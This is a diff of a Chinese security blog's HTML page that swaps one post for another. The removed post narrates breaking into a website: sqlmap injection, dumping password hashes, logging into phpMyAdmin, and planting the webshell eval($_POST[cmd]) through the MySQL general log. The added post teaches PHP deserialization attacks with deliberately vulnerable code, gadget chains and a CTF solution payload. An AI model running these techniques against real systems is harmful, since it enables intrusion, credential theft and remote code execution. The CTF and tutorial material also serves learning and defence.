@@ -22,7 +22,7 @@
     <meta name="description" content="多一份网络防护技能,多一份信息安全保证">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>phpmyadmin写入一句话 · himawari&#39;Blog</title>
+    <title>PHP反序列化原理分析 · himawari&#39;Blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -217,7 +217,7 @@
                 <a href="/" >himawari&#39;Blog</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">phpmyadmin写入一句话</a>
+                <a href="#" class="post-name">PHP反序列化原理分析</a>
             </div>
     </div>
     
@@ -247,7 +247,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            phpmyadmin写入一句话
+            PHP反序列化原理分析
             <!-- 404 -->
             
         </h1>
@@ -266,18 +266,18 @@ height:50vh;
                 
                     <div class= post-intro-tags >
     
-        <a class="post-tag" href="javascript:void(0);" data-tags = "渗透测试">渗透测试</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags = "反序列化">反序列化</a>
     
 </div>
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">1k</span>阅读时长: <span class="post-count reading-time">4 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">1.7k</span>阅读时长: <span class="post-count reading-time">7 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2019/09/28</span>
+                    <span class="post-intro-time">2019/10/03</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -401,65 +401,80 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <p>今天拿到一个网站，过程挺好玩，提到的网址我用<strong>127.0.0.1</strong>代替，这个网站存在sql注入，目录遍历，文件上传。文件包含漏洞，平常练习漏洞这个网站非常完美！</p>
-<p>首先打开网站127.0.0.1 有四个选项 <strong>“最新消息” “产品介绍”  “代理咨询” “联络我们” “登入”</strong> ，在最新消息里发现url为<strong>127.0.0.1/news.php?id=9</strong> 看见ID所以尝试进行sql注入，我是直接放进sqlmap里直接跑了(手动滑稽)，跑的反应也挺好的有sql注入（手动开心）</p>
-<p>web server operating system: Linux Ubuntu<br>web application technology: Apache 2.4.7, PHP 5.5.9<br>back-end DBMS: MySQL 5.0.11</p>
-<p>发现服务器运行系统为<strong>Linux Ubuntu</strong></p>
-<p>Web服务器<strong>Apache 2.4.7</strong> 语言<strong>PHP 5.5.9</strong></p>
-<p>数据库 <strong>MySQL 5.0.11</strong></p>
-<p>有了sql注入就可以搞到后台用户名登录密码，和数据库用户名登录密码。（手动滑稽）</p>
-<p>首先我们先看一下权限是不是root权限 </p>
-<p>运行此命令<strong>sqlmap -u 127.0.0.1/news.php?id=9 –is-dba</strong> </p>
-<p>[11:30:26] [INFO] the back-end DBMS is MySQL<br>web server operating system: Linux Ubuntu<br>web application technology: Apache 2.4.7, PHP 5.5.9<br>back-end DBMS: MySQL 5.0.11<br>[11:30:26] [INFO] testing if current user is DBA<br>[11:30:26] [INFO] fetching current user<br>[11:30:26] [INFO] resumed: newesp@localhost<br>current user is DBA:    <strong>True</strong></p>
-<p>出现true证明我们有root权限</p>
-<p>直接运行sqlmap -u 127.0.0.1/news.php?id=9 –password<br>      database management system users password hashes :</p>
-<p>debian- sys-maint password hash: </p>
-<p>Drupal_ DB password hash: </p>
-<p>mike password hash: password:  </p>
-<p>newesp password hash: *password: *</p>
-<p>phpmyadmin  password hash: </p>
-<p>root password hash: </p>
-<p>获得了两个用户名密码</p>
-<p>  <strong>mike （手动打码）</strong></p>
-<p><strong>newesp （手动打码）</strong></p>
-<p>打开URL 127.0.0.1/phpmyadmin </p>
-<p>能直接打开phpmyadmin 输入newesp 1234568 进入数据库管理后台 可以随意查看数据（手动滑稽）。</p>
-<p>获取了后台用户名密码 开始登陆后台 127.0.0.1/login.php</p>
-<p>进入后台有一个<strong>档案管理</strong>选项 这里虽然有上传文件选项但是做了一定的上传限制没有进行上传绕过，但是在联络我们选项出发现一个目录遍历漏洞127.0.0.1/encode_explorer.php?dir=…/…/</p>
-<p>当在dir出输入一个点时可以看到全部目录 在下面进行上传shell找到真实路径有着重要的作用</p>
-<p>经过一番折腾转到phpmyadmin进行上传shell </p>
-<p>进入phpmyadmin 发现版本信息为 4.0.10deb1ubuntu0.1 搜索了一下这个版本的漏洞有文件包含漏洞 可以查看phpinfo 但是不是主要利用点 下面打开SQL选项 我们需要输入SQL命令来上传我们的shell</p>
-<p>SQL处执行SQL语句</p>
-<p>首先查看general log是否开启</p>
-<p><strong>show variables like ‘general_log’;</strong></p>
-<p>成功运行（进度三分之一）</p>
-<p>我们进入<strong>127.0.0.1/info.php</strong></p>
-<p>可以看到info.php的绝对路径</p>
-<p><strong>/var/www/html/Proic2.0/info.php</strong></p>
-<p>执行sql 语句</p>
-<p><strong>SHOW VARIABLES LIKE “secure_file_priv”;</strong></p>
-<p>secure_file_priv  <strong>/var/lib/mysql-files/</strong></p>
-<p>如果值为文件夹目录，则只允许修改目录下的文件，如果值为<code>NULL</code>则为禁止。</p>
-<p>general log 指的是日志保存状态，一共有两个值（ON/OFF）ON代表开启 OFF代表关闭。</p>
-<p>general log file 指的是日志的保存路径。</p>
-<p>执行sql 语句</p>
-<p><strong>SHOW VARIABLES LIKE ‘general%’</strong></p>
-<p>Variable_name Value<br>general_log ON<br>general_log_file <strong>/var/www/html/Proic2.0/cache/1.php</strong></p>
-<p>开启general_log 的作用：开启它可以记录用户输入的每条命令，会把其保存在<code>/var/www/html/Proic2.0/cache/1.php</code>的一个.log文件中，其实就是我们常说的日志文件<br>利用思路：开启<code>general_log</code>之后把<code>general_log_file</code>的值修改为该网站默认路径下的某一个自定义的php文件中，然后通过log日志进行写入一句话木马，然后再进一步利用。</p>
-<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> global <span class="comment">general_log =</span> <span class="comment">"ON"</span>;</span><br><span class="line"><span class="keyword">set</span> global <span class="comment">general_log_file=</span><span class="comment">'/var/www/html/Proic2.0/cache/ma.php'</span>;</span><br></pre></td></tr></table></figure>
+        <h1 id="浅谈php反序列化漏洞"><a href="#浅谈php反序列化漏洞" class="headerlink" title="浅谈php反序列化漏洞"></a>浅谈php反序列化漏洞</h1><p>php反序列化漏洞，又叫php对象注入漏洞。</p>
+<h3 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h3><p>php中有两个函数<a href="http://php.net/manual/zh/function.serialize.php" target="_blank" rel="noopener">serialize()</a> 和<a href="http://php.net/manual/zh/function.unserialize.php" target="_blank" rel="noopener">unserialize()</a>。</p>
+<h4 id="serialize"><a href="#serialize" class="headerlink" title="serialize()"></a>serialize()</h4><p>当在php中创建了一个对象后，可以通过serialize()把这个对象转变成一个字符串，保存对象的值方便之后的传递与使用。测试代码如下；</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">class chybeta&#123;	var $test = &apos;123&apos;;&#125;</span><br><span class="line">$class1 = new chybeta;$class1_ser = serialize($class1);</span><br><span class="line">print_r($class1_ser);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
-<p>执行后可以看到生成的伪日志文件ma.php<br>此时在利用日志的记录插入一句话<br><code>select &#39;&lt;?php eval($_POST[cmd]);?&gt;&#39;;</code></p>
-<p>打开日志可以看到记录</p>
-<p>最后getshell</p>
+<p>这边我们创建了一个新的对象，并且将其序列化后的结果打印出来：</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:7</span><span class="selector-pseudo">:"chybeta"</span><span class="selector-pseudo">:1</span>:&#123;<span class="attribute">s</span>:<span class="number">4</span>:<span class="string">"test"</span>;<span class="attribute">s</span>:<span class="number">3</span>:<span class="string">"123"</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的<code>O</code>代表存储的是对象（object）,假如你给serialize()传入的是一个数组，那它会变成字母a。<code>7</code>表示对象的名称有7个字符。<code>&quot;chybeta&quot;</code>表示对象的名称。<code>1</code>表示有一个值。<code>{s:4:&quot;test&quot;;s:3:&quot;123&quot;;}</code>中，<code>s</code>表示字符串，<code>4</code>表示该字符串的长度，<code>&quot;test&quot;</code>为字符串的名称，之后的类似。</p>
+<h4 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize()"></a>unserialize()</h4><p>与 serialize() 对应的，unserialize()可以从已存储的表示中创建PHP的值，单就本次所关心的环境而言，可以从序列化后的结果中恢复对象（object）。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">class chybeta&#123;	</span><br><span class="line">    var $test = &apos;123&apos;;&#125;</span><br><span class="line">$class2 = &apos;O:7:&quot;chybeta&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;123&quot;;&#125;&apos;;	</span><br><span class="line">print_r($class2);</span><br><span class="line">echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">$class2_unser = unserialize($class2);</span><br><span class="line">print_r($class2_ser);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里提醒一下，当使用 unserialize() 恢复对象时， 将调用 __wakeup() 成员函数。</p>
+<h3 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h3><p>由前面可以看出，当传给 unserialize() 的参数可控时，我们可以通过传入一个精心构造的序列化字符串，从而控制对象内部的变量甚至是函数。</p>
+<h3 id="利用构造函数等"><a href="#利用构造函数等" class="headerlink" title="利用构造函数等"></a>利用构造函数等</h3><h4 id="Magic-function"><a href="#Magic-function" class="headerlink" title="Magic function"></a>Magic function</h4><p>php中有一类特殊的方法叫“<a href="https://secure.php.net/manual/zh/language.oop5.magic.php" target="_blank" rel="noopener">Magic function</a>”， 这里我们着重关注一下几个：</p>
+<ul>
+<li>构造函数__construct()：当对象创建(new)时会自动调用。但在unserialize()时是不会自动调用的。</li>
+<li>析构函数__destruct()：当对象被销毁时会自动调用。</li>
+<li>__wakeup() ：如前所提，unserialize()时会自动调用。</li>
+</ul>
+<p>测试如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class chybeta&#123;</span><br><span class="line">var $test = &apos;123&apos;;	</span><br><span class="line">function __wakeup()&#123;		</span><br><span class="line">    echo &quot;__wakeup&quot;;		</span><br><span class="line">    echo &quot;&lt;/br&gt;&quot;;	&#125;	</span><br><span class="line">    function __construct()&#123;		</span><br><span class="line">        echo &quot;__construct&quot;;		</span><br><span class="line">        echo &quot;&lt;/br&gt;&quot;;	&#125;	</span><br><span class="line">    function __destruct()&#123;		</span><br><span class="line">        echo &quot;__destruct&quot;;		</span><br><span class="line">        echo &quot;&lt;/br&gt;&quot;;	&#125;&#125;</span><br><span class="line">$class2 = &apos;O:7:&quot;chybeta&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;123&quot;;&#125;&apos;;	</span><br><span class="line">print_r($class2);echo &quot;&lt;/br&gt;&quot;;$class2_unser = unserialize($class2);print_r($class2_unser);</span><br><span class="line">echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h3><h4 id="wakeup-或destruct"><a href="#wakeup-或destruct" class="headerlink" title="wakeup() 或destruct()"></a><strong>wakeup() 或</strong>destruct()</h4><p>由前可以看到，unserialize()后会导致<strong>wakeup()  或</strong>destruct()的直接调用，中间无需其他过程。因此最理想的情况就是一些漏洞/危害代码在<strong>wakeup()  或</strong>destruct()中，从而当我们控制序列化字符串时可以去直接触发它们。这里针对 __wakeup()  场景做个实验。假设index源码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">class chybeta&#123;	</span><br><span class="line">var $test = &apos;123&apos;;	</span><br><span class="line">function __wakeup()&#123;		</span><br><span class="line">$fp = fopen(&quot;shell.php&quot;,&quot;w&quot;) ;		</span><br><span class="line">fwrite($fp,$this-&gt;test);		</span><br><span class="line">fclose($fp);	</span><br><span class="line">&#125;&#125;</span><br><span class="line">$class3 = $_GET[&apos;test&apos;];</span><br><span class="line">print_r($class3);</span><br><span class="line">echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">$class3_unser = unserialize($class3);</span><br><span class="line">require &quot;shell.php&quot;;// 为显示效果，把这个shell.php包含进来</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>同目录下有个空的shell.php文件。一开始访问index.php。</p>
+<p><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170617/3.jpg?raw=true" target="_blank" rel="noopener"><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170617/3.jpg?raw=true" alt="img"></a></p>
+<p>基本的思路是，本地搭建好环境，通过 serialize() 得到我们要的序列化字符串，之后再传进去。通过源代码知，把对象中的test值赋为  “<?php phpinfo();  ?>”,再调用unserialize()时会通过__wakeup()把test的写入到shell.php中。为此我们写个php脚本：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span>class chybeta&#123;	<span class="keyword">var</span> $test = <span class="string">'123'</span>;	<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;		$fp = fopen(<span class="string">"shell.php"</span>,<span class="string">"w"</span>) ;		fwrite($fp,<span class="keyword">$this</span>-&gt;test);		fclose($fp);	&#125;&#125;$class4 = <span class="keyword">new</span> chybeta();$class4-&gt;test = <span class="string">"&lt;?php phpinfo(); ?&gt;"</span>;	$class4_ser = serialize($class4);	print_r($class4_ser);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>由此得到序列化结果：</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:7</span><span class="selector-pseudo">:"chybeta"</span><span class="selector-pseudo">:1</span>:&#123;<span class="attribute">s</span>:<span class="number">4</span>:<span class="string">"test"</span>;<span class="attribute">s</span>:<span class="number">19</span>:<span class="string">"&lt;?php phpinfo(); ?&gt;"</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="其他Magic-function的利用"><a href="#其他Magic-function的利用" class="headerlink" title="其他Magic function的利用"></a>其他Magic function的利用</h4><p>但如果一次unserialize()中并不会直接调用的魔术函数，比如前面提到的<strong>construct()，是不是就没有利用价值呢？非也。类似于PWN中的ROP，有时候反序列化一个对象时，由它调用的</strong>wakeup()中又去调用了其他的对象，由此可以溯源而上，利用一次次的“gadget”找到漏洞点。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">class ph0en1x&#123;	</span><br><span class="line">function __construct($test)&#123;		</span><br><span class="line">$fp = fopen(&quot;shell.php&quot;,&quot;w&quot;) ;		</span><br><span class="line">fwrite($fp,$test);		</span><br><span class="line">fclose($fp);	</span><br><span class="line">&#125;&#125;</span><br><span class="line">class chybeta&#123;	</span><br><span class="line">var $test = &apos;123&apos;;	</span><br><span class="line">function __wakeup()&#123;		</span><br><span class="line">$obj = new ph0en1x($this-&gt;test);	</span><br><span class="line">&#125;&#125;</span><br><span class="line">$class5 = $_GET[&apos;test&apos;];</span><br><span class="line">print_r($class5);</span><br><span class="line">echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">$class5_unser = unserialize($class5);</span><br><span class="line">require &quot;shell.php&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里我们给test传入构造好的序列化字符串后，进行反序列化时自动调用 <strong>wakeup()函数，从而在new ph0en1x()会自动调用对象ph0en1x中的</strong>construct()方法，从而把<code>&lt;?php phpinfo() ?&gt;</code>写入到 shell.php中。</p>
+<h4 id="利用普通成员方法"><a href="#利用普通成员方法" class="headerlink" title="利用普通成员方法"></a>利用普通成员方法</h4><p>前面谈到的利用都是基于“自动调用”的magic function。但当漏洞/危险代码存在类的普通方法中，就不能指望通过“自动调用”来达到目的了。这时的利用方法如下，寻找相同的函数名，把敏感函数和类联系在一起。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class chybeta &#123;   </span><br><span class="line">var $test;    </span><br><span class="line">function __construct() &#123;        </span><br><span class="line">$this-&gt;test = new ph0en1x();    </span><br><span class="line">&#125;    </span><br><span class="line">function __destruct() &#123;        </span><br><span class="line">$this-&gt;test-&gt;action();    </span><br><span class="line">&#125;&#125;</span><br><span class="line">class ph0en1x &#123;    </span><br><span class="line">function action() &#123;        </span><br><span class="line">echo &quot;ph0en1x&quot;;    </span><br><span class="line">&#125;&#125;</span><br><span class="line">class ph0en2x &#123;    </span><br><span class="line">var $test2;    </span><br><span class="line">function action() &#123;        </span><br><span class="line">eval($this-&gt;test2);    </span><br><span class="line">&#125;&#125;</span><br><span class="line">$class6 = new chybeta();</span><br><span class="line">unserialize($_GET[&apos;test&apos;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>本意上，new一个新的chybeta对象后，调用<strong>construct()，其中又new了ph0en1x对象。在结束后会调用</strong>destruct()，其中会调用action()，从而输出 ph0en1x。</p>
+<p>下面是利用过程。构造序列化。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class chybeta &#123;    </span><br><span class="line">var $test;    </span><br><span class="line">function __construct() &#123;        </span><br><span class="line">$this-&gt;test = new ph0en2x();    </span><br><span class="line">&#125;&#125;</span><br><span class="line">class ph0en2x &#123;    </span><br><span class="line">var $test2 = &quot;phpinfo();&quot;;&#125;</span><br><span class="line">echo serialize(new chybeta());</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>得到：</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:7</span><span class="selector-pseudo">:"chybeta"</span><span class="selector-pseudo">:1</span>:&#123;<span class="attribute">s</span>:<span class="number">4</span>:<span class="string">"test"</span>;<span class="attribute">O</span>:<span class="number">7</span>:<span class="string">"ph0en2x"</span>:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">"test2"</span>;<span class="attribute">s</span>:<span class="number">10</span>:<span class="string">"phpinfo();"</span>;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>传给index.php的test参数，利用成功：</p>
+<h4 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h4><p>这里实战一题比较简单的<a href="http://web.jarvisoj.com:32768/index.php" target="_blank" rel="noopener">ctf题目</a>吧</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    require_once(&apos;shield.php&apos;);</span><br><span class="line">    $x = new Shield();</span><br><span class="line">    isset($_GET[&apos;class&apos;]) &amp;&amp; $g = $_GET[&apos;class&apos;];</span><br><span class="line">    if (!empty($g)) &#123;</span><br><span class="line">        $x = unserialize($g);</span><br><span class="line">    &#125;</span><br><span class="line">    echo $x-&gt;readfile();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以看见 先是包含了shield.php 然后从中new了个新的实例出来 最后接收用户的反序列化 输出readfile()方法</p>
+<p>跟进：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    //flag is in pctf.php</span><br><span class="line">    class Shield &#123;</span><br><span class="line">        public $file;</span><br><span class="line">        function __construct($filename = &apos;&apos;) &#123;</span><br><span class="line">            $this -&gt; file = $filename;</span><br><span class="line">        &#125;</span><br><span class="line">        function readfile() &#123;</span><br><span class="line">            if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&apos;..&apos;)===FALSE  </span><br><span class="line">            &amp;&amp; stripos($this-&gt;file,&apos;/&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;\\&apos;)==FALSE) &#123;</span><br><span class="line">                return @file_get_contents($this-&gt;file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里我们可以看见只要操控$file这个参数为pctf.php就可以了，这里construct函数在实例被创建的时候(也就是new Shield()的时候)执行，所以不会影响我们对$file的操作</p>
+<p>直接构造序列化对象传过去 O:6:”Shield”:1:{s:4:”file”;s:8:”pctf.php”;} 就行了</p>
+<h4 id="餐后甜点"><a href="#餐后甜点" class="headerlink" title="餐后甜点"></a>餐后甜点</h4><p>更多反序列化的漏洞分析：</p>
+<blockquote>
+<p><a href="http://www.freebuf.com/column/161798.html" target="_blank" rel="noopener">http://www.freebuf.com/column/161798.html</a></p>
+<p><a href="http://p0sec.net/index.php/archives/114/" target="_blank" rel="noopener">http://p0sec.net/index.php/archives/114/</a></p>
+<p><a href="http://paper.tuisec.win/detail/fa497a4e50b5d83" target="_blank" rel="noopener">http://paper.tuisec.win/detail/fa497a4e50b5d83</a></p>
+<p><a href="https://www.anquanke.com/post/id/84922" target="_blank" rel="noopener">https://www.anquanke.com/post/id/84922</a></p>
+</blockquote>
 
     </article>
     <!-- license  -->
     
         <div class="license-wrapper">
             <p>原文作者：<a href="blog.shenzihao.top">申子昊</a>
-            <p>原文链接：<a href="blog.shenzihao.top/2019/09/28/phpmyadmin写入一句话/">blog.shenzihao.top/2019/09/28/phpmyadmin写入一句话/</a>
-            <p>发表日期：<a href="blog.shenzihao.top/2019/09/28/phpmyadmin写入一句话/">九月 28日 2019, 11:13:08 上午</a>
-            <p>更新日期：<a href="blog.shenzihao.top/2019/09/28/phpmyadmin写入一句话/">September 28th 2019, 12:35:49 pm</a>
+            <p>原文链接：<a href="blog.shenzihao.top/2019/10/03/PHP反序列化原理分析/">blog.shenzihao.top/2019/10/03/PHP反序列化原理分析/</a>
+            <p>发表日期：<a href="blog.shenzihao.top/2019/10/03/PHP反序列化原理分析/">十月 3日 2019, 5:44:46 下午</a>
+            <p>更新日期：<a href="blog.shenzihao.top/2019/10/03/PHP反序列化原理分析/">October 3rd 2019, 5:58:46 pm</a>
             <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -468,16 +483,16 @@ height:50vh;
         <li class="next">
             
                 <div class="nextSlogan">Next Post</div>
-                <a href= "/2019/09/28/手工注入语句/" title= "手工注入语句">
-                    <div class="nextTitle">手工注入语句</div>
+                <a href= "/2019/10/03/Java反序列化漏洞的原理分析/" title= "Java反序列化漏洞的原理分析">
+                    <div class="nextTitle">Java反序列化漏洞的原理分析</div>
                 </a>
             
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href= "/2019/09/20/webshell/" title= "记一次webshell">
-                    <div class="prevTitle">记一次webshell</div>
+                <a href= "/2019/10/03/FUZZ工具/" title= "FUZZ工具">
+                    <div class="prevTitle">FUZZ工具</div>
                 </a>
             
         </li>
@@ -565,7 +580,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#浅谈php反序列化漏洞"><span class="toc-number">1.</span> <span class="toc-text">浅谈php反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#序列化与反序列化"><span class="toc-number">1.0.1.</span> <span class="toc-text">序列化与反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#serialize"><span class="toc-number">1.0.1.1.</span> <span class="toc-text">serialize()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#unserialize"><span class="toc-number">1.0.1.2.</span> <span class="toc-text">unserialize()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#反序列化漏洞"><span class="toc-number">1.0.2.</span> <span class="toc-text">反序列化漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用构造函数等"><span class="toc-number">1.0.3.</span> <span class="toc-text">利用构造函数等</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Magic-function"><span class="toc-number">1.0.3.1.</span> <span class="toc-text">Magic function</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用场景"><span class="toc-number">1.0.4.</span> <span class="toc-text">利用场景</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#wakeup-或destruct"><span class="toc-number">1.0.4.1.</span> <span class="toc-text">wakeup() 或destruct()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#其他Magic-function的利用"><span class="toc-number">1.0.4.2.</span> <span class="toc-text">其他Magic function的利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#利用普通成员方法"><span class="toc-number">1.0.4.3.</span> <span class="toc-text">利用普通成员方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#实例分析"><span class="toc-number">1.0.4.4.</span> <span class="toc-text">实例分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#餐后甜点"><span class="toc-number">1.0.4.5.</span> <span class="toc-text">餐后甜点</span></a></li></ol></li></ol></li></ol></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
